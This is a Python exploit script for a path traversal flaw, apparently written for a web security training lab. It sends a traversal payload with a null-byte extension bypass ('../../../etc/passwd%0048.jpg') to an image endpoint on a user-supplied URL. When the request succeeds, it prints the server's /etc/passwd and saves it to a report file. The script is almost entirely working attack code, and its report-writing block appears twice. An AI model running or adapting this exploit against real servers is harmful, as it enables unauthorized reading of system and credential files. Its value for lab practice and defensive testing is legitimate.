import sys
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = { 'http' : 'http://127.0.0.1:8080', 'https' : 'http://127.0.0.1:8080' }

def directory_traversal_exploit(url):
    image_url = url + '/image?filename=../../../etc/passwd%0048.jpg'
    r = requests.get(image_url, verify=False, proxies=proxies)
    print(image_url)
    if "root:x" in r.text:
        print('(+) Exploit successful! \n')
        print('(+) THe content of the file /etc/passwd : \n')
        print(r.text)

        # storing the exploited result in a report sheet
        with open("Directory_Traversal_Report.txt", "w") as report:
            report.write("(+) Exploit was successful!\n")
            report.write("(+) The following is the content of the /etc/passwd file:\n\n")
            report.write(r.text)

        # storing the exploited result in a report sheet
        with open("Directory_Traversal_Report.txt", "w") as report:
            report.write("(+) Exploit was successful!\n")
            report.write("(+) The following is the content of the /etc/passwd file:\n\n")
            report.write(r.text)
    
    else:
        print('(+) Exploit failed.')
        print(r.text)
        sys.exit(-1)



def main():
    if len(sys.argv) != 2:
        print('(+) Usage %s <url>' % sys.argv[0])
        print('(+) Example %s www.example.com' % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print('(+) Exploiting the directory traversal vulnerability \n')
    directory_traversal_exploit(url)

if __name__ == "__main__":
    main()
